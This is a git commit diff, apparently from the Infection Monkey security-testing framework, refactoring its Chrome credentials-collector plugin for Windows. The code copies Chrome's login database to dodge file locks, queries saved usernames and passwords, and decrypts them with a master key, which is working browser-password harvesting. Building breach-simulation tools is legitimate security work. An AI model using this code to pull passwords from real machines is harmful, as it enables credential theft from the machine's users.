7030ccdc924a2e817e767fcb09e59a361a8893ec
Kekoa Kaaikala <kekoa.kaaikala@gmail.com>
2023-09-12 20:20:11 +0000

    Chrome: Extract database reading code

--- monkey/agent_plugins/credentials_collectors/chrome/src/windows_credentials_database_processor.py
+++ monkey/agent_plugins/credentials_collectors/chrome/src/windows_credentials_database_processor.py
@@ -3,7 +3,7 @@ import shutil
 import sqlite3
 import tempfile
 from pathlib import Path
-from typing import Collection, List, Optional, Tuple
+from typing import Callable, Collection, Iterator, Optional, Tuple
 
 from Cryptodome.Cipher import AES
 
@@ -17,30 +17,56 @@ from .windows_decryption import win32crypt_unprotect_data
 logger = logging.getLogger(__name__)
 
 
+DATABASE_QUERY = "SELECT username_value, password_value FROM logins"
+
+
+def get_logins_from_database(database_path: Path) -> Iterator[Tuple[str, bytes]]:
+    with tempfile.NamedTemporaryFile() as temporary_database_file:
+        temporary_database_path = Path(tempfile.gettempdir()) / temporary_database_file.name
+
+        # copy database before querying it to bypass lock errors
+        with open(database_path, "rb") as database_file:
+            shutil.copyfileobj(database_file, temporary_database_file)
+
+        try:
+            yield from _extract_credentials(temporary_database_path)
+        except Exception as err:
+            logger.debug(f"{err}")
+
+
+def _extract_credentials(temporary_database_path: Path) -> Iterator[Tuple[str, bytes]]:
+    try:
+        conn = sqlite3.connect(temporary_database_path)
+        for user, password in conn.execute(DATABASE_QUERY):
+            yield user, password
+    except Exception as err:
+        logger.error(f"Encountered an exception while connecting to database: {err}")
+
+
+DatabaseReader = Callable[[Path], Iterator[Tuple[str, bytes]]]
+
+
 class WindowsCredentialsDatabaseProcessor:
+    def __init__(self, database_reader: DatabaseReader = get_logins_from_database):
+        self._read_logins_from_database = database_reader
+
     def __call__(
         self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
     ) -> Collection[Credentials]:
         credentials = []
 
         for item in interruptible_iter(database_paths, interrupt):
-            with tempfile.NamedTemporaryFile() as temporary_database_file:
-                temporary_database_path = Path(tempfile.gettempdir()) / temporary_database_file.name
-
-                # copy database before querying it to bypass lock errors
-                with open(item.database_file_path, "rb") as database_file:
-                    shutil.copyfileobj(database_file, temporary_database_file)
-
+            for user, password in self._read_logins_from_database(item.database_file_path):
                 try:
-                    credentials.extend(
-                        self._extract_credentials(
-                            temporary_database_path=temporary_database_path,
-                            master_key=item.master_key,
-                        )
-                    )
+                    decrypted_password = self._decrypt_password(password, item.master_key)
+                    if user or decrypted_password:
+                        credentials.append((user, decrypted_password))
                 except Exception as err:
-                    logger.debug(f"{err}")
-
+                    logger.error(
+                        f"Encountered an exception while trying to decrypt the password: {err}"
+                    )
+                    # even if the password couldn't be decrypted, we don't want to lose the username
+                    credentials.append((user, ""))
         return [
             Credentials(
                 identity=self._get_identity(user),
@@ -55,46 +81,6 @@ class WindowsCredentialsDatabaseProcessor:
             return EmailAddress(email_address=user)
         except ValueError:
             return Username(username=user)
-
-    def _extract_credentials(
-        self, temporary_database_path: Path, master_key: Optional[bytes] = None
-    ) -> List[Tuple[str, str]]:
-        """
-        Extracts credentials from the given database
-        """
-
-        database_query = "SELECT username_value, password_value FROM logins"
-
-        credentials: List[Tuple[str, str]] = []
-
-        try:
-            conn = sqlite3.connect(temporary_database_path)
-        except Exception as err:
-            logger.error(f"Encountered an exception while connecting to database: {err}")
-            return credentials
-
-        try:
-            cursor = conn.cursor()
-            cursor.execute(database_query)
-        except Exception as err:
-            logger.error(f"Encountered an exception while executing query on database: {err}")
-            return credentials
-
-        for username, password in cursor.fetchall():
-            try:
-                password = self._decrypt_password(password, master_key)
-                if username or password:
-                    credentials.append((username, password))
-            except Exception as err:
-                logger.error(
-                    f"Encountered an exception while trying to decrypt the password: {err}"
-                )
-                # even if the password couldn't be decrypted, we don't want to lose the username
-                credentials.append((username, ""))
-
-        conn.close()
-
-        return credentials
 
     def _decrypt_password(self, encrypted_password: bytes, master_key: Optional[bytes]) -> str:
         if encrypted_password.startswith(b"v10"):  # chromium > v80
